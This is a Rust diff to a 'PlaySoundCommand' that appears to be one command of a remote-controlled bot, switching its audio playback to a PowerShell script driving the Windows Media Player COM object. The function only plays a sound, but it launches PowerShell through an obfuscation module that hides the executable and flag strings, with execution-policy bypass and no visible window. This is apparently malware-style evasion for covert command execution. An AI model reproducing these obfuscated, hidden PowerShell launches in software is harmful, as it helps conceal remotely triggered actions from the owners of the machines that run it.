@@ -93,45 +93,43 @@ impl BotCommand for PlaySoundCommand {
 }
 
 impl PlaySoundCommand {
-    fn play_local(file_path: &str, _volume: u32) -> Result<()> {
-        // Use PowerShell with .NET SoundPlayer for WAV files, or mciSendString for MP3
-        let ext = std::path::Path::new(file_path)
-            .extension()
-            .and_then(|e| e.to_str())
-            .unwrap_or("")
-            .to_lowercase();
+    fn play_local(file_path: &str, volume: u32) -> Result<()> {
+        // Use PowerShell with Windows Media Player COM object - most reliable
+        let vol_level = volume.min(100);
+        
+        let ps_script = format!(
+            r#"
+$wmp = New-Object -ComObject WMPlayer.OCX
+$wmp.settings.volume = {}
+$wmp.URL = '{}'
+Start-Sleep -Milliseconds 500
+while ($wmp.playState -eq 3) {{ Start-Sleep -Milliseconds 200 }}
+Start-Sleep -Milliseconds 500
+$wmp.close()
+"#,
+            vol_level,
+            file_path.replace("'", "''")
+        );
 
-        let ps_script = if ext == "wav" {
-            // WAV files: Use SoundPlayer (synchronous, reliable)
-            format!(
-                r#"Add-Type -AssemblyName System.Media; $p = New-Object System.Media.SoundPlayer '{}'; $p.PlaySync()"#,
-                file_path.replace("'", "''")
-            )
-        } else {
-            // MP3/other formats: Use mciSendString
-            format!(
-                r#"Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class MCI {{
-    [DllImport("winmm.dll")]
-    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int retLen, IntPtr hwnd);
-}}
-'@
-$f = '{}'
-[MCI]::mciSendString("close all", $null, 0, [IntPtr]::Zero)
-[MCI]::mciSendString("open `"$f`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)
-[MCI]::mciSendString("play mp3 wait", $null, 0, [IntPtr]::Zero)
-[MCI]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)"#,
-                file_path.replace("'", "''").replace("`", "``")
-            )
-        };
+        log_debug!("[PlaySound] Playing: {} at volume {}", file_path, vol_level);
 
         use crate::utils::obfuscate::{exe, powershell as ps};
-        std::process::Command::new(exe::powershell())
-            .args(&[&ps::no_profile(), &ps::window_style(), &ps::hidden(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
+        let output = std::process::Command::new(exe::powershell())
+            .args(&[&ps::no_profile(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
             .creation_flags(CREATE_NO_WINDOW)
-            .spawn()?;
+            .output();
+        
+        match output {
+            Ok(out) => {
+                if !out.status.success() {
+                    let stderr = String::from_utf8_lossy(&out.stderr);
+                    log_debug!("[PlaySound] PowerShell error: {}", stderr);
+                }
+            }
+            Err(e) => {
+                log_debug!("[PlaySound] Failed to spawn: {}", e);
+            }
+        }
 
         Ok(())
     }
